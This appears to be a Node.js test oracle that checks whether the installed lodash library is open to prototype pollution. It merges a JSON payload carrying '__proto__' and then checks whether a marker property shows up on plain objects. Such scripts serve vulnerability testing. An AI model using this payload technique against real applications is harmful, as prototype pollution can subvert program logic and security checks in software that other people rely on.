const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  const result = {
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  };
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

try {
  const _ = require('lodash');

  const marker = path.join(os.tmpdir(), 'lodash-oracle-' + process.pid + '-' + Date.now() + '.json');

  // Cleanup any prior pollution state if present
  try { delete Object.prototype.oraclePolluted; } catch (_) {}

  // Benign operation: verify normal merge behavior
  const benignDst = { a: 1 };
  const benignSrc = { b: 2 };
  const benignOut = _.merge(benignDst, benignSrc);

  if (!benignOut || benignOut.a !== 1 || benignOut.b !== 2 || benignDst.b !== 2) {
    throw new Error('Benign merge did not behave as expected');
  }

  operation_completed = true;

  // Malicious payload targeting prototype pollution in vulnerable lodash
  const payload = JSON.parse('{"__proto__":{"oraclePolluted":"YES"}}');

  try {
    _.merge({}, payload);
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious merge threw: ' + (e && e.message ? e.message : String(e));
    fs.writeFileSync(marker, JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
    finish();
    return;
  }

  const polluted = ({}).oraclePolluted === 'YES';
  exploit_succeeded = polluted;
  evidence = polluted
    ? 'Object.prototype.oraclePolluted became visible on plain object'
    : 'No prototype pollution observed after malicious merge';

  fs.writeFileSync(marker, JSON.stringify({ operation_completed, exploit_succeeded, evidence }));

  // Best-effort cleanup
  try { delete Object.prototype.oraclePolluted; } catch (_) {}
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (e && e.message ? e.message : String(e));
}

finish();